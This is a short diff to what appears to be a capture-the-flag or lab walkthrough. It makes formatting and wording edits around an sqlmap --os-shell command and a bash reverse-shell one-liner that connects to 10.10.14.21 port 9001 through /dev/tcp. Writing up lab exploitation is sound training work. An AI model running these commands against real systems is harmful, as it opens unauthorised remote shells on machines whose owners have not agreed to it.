@@ -64,8 +64,10 @@ In some rare cases, sqlmap can obtain a operating system shell with flag ```--os
 sqlmap -r ./request.txt --dbs --os-shell --force-ssl --timeout 1000000000
 ```
 </br>
-It worked! to get a reverse shell, I used this command ```bash -c 'bash -i &> /dev/tcp/10.10.14.21/9001 0>&1'``` </br>
+
+It worked! to get a reverse shell, I then used this command to get a stable shell: ```bash -c 'bash -i &> /dev/tcp/10.10.14.21/9001 0>&1'``` </br>
 ![initial_shell](initial_shell.png) </br>
-#Privilege Escalation
+
+# Privilege Escalation
 
 
